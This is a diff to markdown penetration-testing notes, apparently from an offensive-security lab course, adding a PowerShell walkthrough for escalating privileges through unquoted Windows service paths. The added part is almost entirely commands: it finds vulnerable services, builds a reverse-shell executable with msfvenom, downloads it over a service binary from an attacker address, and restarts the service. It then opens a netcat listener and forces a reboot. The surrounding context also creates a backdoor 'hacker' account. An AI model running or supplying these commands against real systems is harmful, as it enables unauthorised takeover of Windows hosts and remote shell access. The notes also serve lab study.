@@ -1285,7 +1285,7 @@ C:\Windows\System32\fodhelper.exe
 Another interesting attack vector that can lead to privilege escalation on Windows operating systems revolves around unquoted service paths.1 We can use this attack when we have write permissions to a service's main directory and subdirectories but cannot replace files within them. Please note that this section of the module will not be reproducible on your dedicated client. However, you will be able to use this technique on various hosts inside the lab environment.
 
 As we have seen in the previous section, each Windows service maps to an executable file that will be run when the service is started. Most of the time, services that accompany third party software are stored under the C:\Program Files directory, which contains a space character in its name. This can potentially be turned into an opportunity for a privilege escalation attack.
-
+#### cmd.exe
 ````
 wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v """
 ````
@@ -1324,6 +1324,42 @@ sc qc "Some vulnerable service" #if the above failed check the privledges above 
 whoami /priv #if the above failed check to see if you have shutdown privledges
 shutdown /r /t 0 #wait for a shell to comeback
 ````
+#### Powershell
+#### Enumeration
+````
+https://juggernaut-sec.com/unquoted-service-paths/#:~:text=Enumerating%20Unquoted%20Service%20Paths%20by%20Downloading%20and%20Executing,bottom%20of%20the%20script%3A%20echo%20%27Invoke-AllChecks%27%20%3E%3E%20PowerUp.ps1 # follow this
+````
+````
+Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
+````
+````
+Name               DisplayName                            StartMode PathName                                           
+----               -----------                            --------- --------                                           
+LSM                LSM                                    Unknown                                                      
+NetSetupSvc        NetSetupSvc                            Unknown                                                      
+postgresql-9.2     postgresql-9.2 - PostgreSQL Server 9.2 Auto      C:/exacqVisionEsm/PostgreSQL/9.2/bin/pg_ctl.exe ...
+RemoteMouseService RemoteMouseService                     Auto      C:\Program Files (x86)\Remote Mouse\RemoteMouseS...
+solrJetty          solrJetty                              Auto      C:\exacqVisionEsm\apache_solr/apache-solr\script...
+
+````
+````
+move "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe" "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe.bak"
+````
+````
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.140 LPORT=80 -f exe -o shell.exe
+Invoke-WebRequest -Uri "http://192.168.119.140:8000/shell.exe" -OutFile "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe"
+````
+````
+get-service *exac*
+stop-service ESMWebService*
+start-service ESMWebService*
+````
+````
+nc -nlvp 80
+shutdown /r /t 0 /f #sometimes it takes a minute or two...
+````
+
+
 ### Adding a user with high privs
 ````
 net user hacker password /add
